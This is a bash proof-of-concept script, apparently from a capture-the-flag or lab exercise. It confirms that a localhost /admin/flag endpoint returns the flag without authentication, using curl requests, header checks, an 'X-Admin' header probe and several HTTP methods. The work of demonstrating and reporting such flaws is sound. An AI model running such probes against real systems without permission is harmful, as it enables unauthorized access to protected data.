#!/bin/bash

# POC: Unauthorized Access to /admin/flag Endpoint
# This script demonstrates that the /admin/flag endpoint is completely exposed
# without any authentication or authorization controls.

TARGET_URL="http://localhost:8080/admin/flag"

echo "=========================================="
echo "POC: Unauthorized Admin Flag Access"
echo "=========================================="
echo ""

# Test 1: Direct unauthenticated GET request
echo "[TEST 1] Direct unauthenticated GET request to /admin/flag"
echo "Command: curl -s -i $TARGET_URL"
echo ""

RESPONSE=$(curl -s -i "$TARGET_URL")
echo "$RESPONSE"
echo ""

# Extract HTTP status code
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
echo "[RESULT] HTTP Status: $HTTP_STATUS"
echo ""

# Test 2: Check if flag is in response
echo "[TEST 2] Verify flag content is returned"
BODY=$(curl -s "$TARGET_URL")
if echo "$BODY" | grep -q "flag{"; then
    echo "[VULNERABLE] Flag found in response:"
    echo "$BODY"
    echo ""
    echo "[CRITICAL] The endpoint returns the flag without requiring authentication!"
else
    echo "[INFO] No flag found in response"
fi
echo ""

# Test 3: Verify no authentication is required
echo "[TEST 3] Verify no session or authentication headers are required"
echo "Testing with empty headers and no credentials..."
RESPONSE_HEADERS=$(curl -s -i "$TARGET_URL" | head -n 20)
echo "Response Headers:"
echo "$RESPONSE_HEADERS" | head -n 10
echo ""

if ! echo "$RESPONSE_HEADERS" | grep -q "Set-Cookie"; then
    echo "[VULNERABLE] No Set-Cookie header - no session required"
fi

if ! echo "$RESPONSE_HEADERS" | grep -q "WWW-Authenticate"; then
    echo "[VULNERABLE] No WWW-Authenticate header - no auth challenge"
fi
echo ""

# Test 4: Test with arbitrary headers (should still work)
echo "[TEST 4] Testing with arbitrary header manipulation (X-Admin)"
ARBITRARY_HEADER_RESPONSE=$(curl -s -i -H "X-Admin: false" "$TARGET_URL" | head -n 1)
echo "Response with X-Admin: false header:"
echo "$ARBITRARY_HEADER_RESPONSE"
echo ""

if echo "$ARBITRARY_HEADER_RESPONSE" | grep -q "200"; then
    echo "[VULNERABLE] Access not denied despite X-Admin: false header"
fi
echo ""

# Test 5: Verify endpoint is accessible via different methods
echo "[TEST 5] Testing HTTP method support"
for METHOD in GET HEAD OPTIONS; do
    RESPONSE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X "$METHOD" "$TARGET_URL")
    echo "[$METHOD] HTTP Status: $RESPONSE_STATUS"
done
echo ""

echo "=========================================="
echo "VULNERABILITY CONFIRMED"
echo "=========================================="
echo "The /admin/flag endpoint is completely exposed without:"
echo "  - Authentication requirements"
echo "  - Authorization checks"
echo "  - Session validation"
echo "  - CSRF protection"
echo ""
echo "Any unauthenticated user can access and retrieve the flag."
echo "=========================================="